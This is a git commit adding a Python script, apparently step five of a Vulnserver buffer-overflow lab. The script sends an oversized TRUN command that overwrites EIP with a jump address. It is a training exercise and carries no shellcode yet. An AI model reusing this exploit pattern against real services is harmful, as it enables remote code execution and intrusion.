620ac5304ebf2d7a8e1d14c2f2276c34a43fda1f
deciacco <ec@deciacco.com>
2021-03-26 12:53:20 -0500

    jumpcode in eip

---
+++ BoF_Vulnserver/05_jumpcode.py
@@ -0,0 +1,19 @@
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+# 625011af
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" # x86 architecture, little endian
+
+try:
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.4.104',9999))
+
+	payload = "TRUN /.:/" + shellcode
+
+	s.send((payload.encode()))
+	s.close()
+except:
+	print ("Error connecting to server")
+	sys.exit()
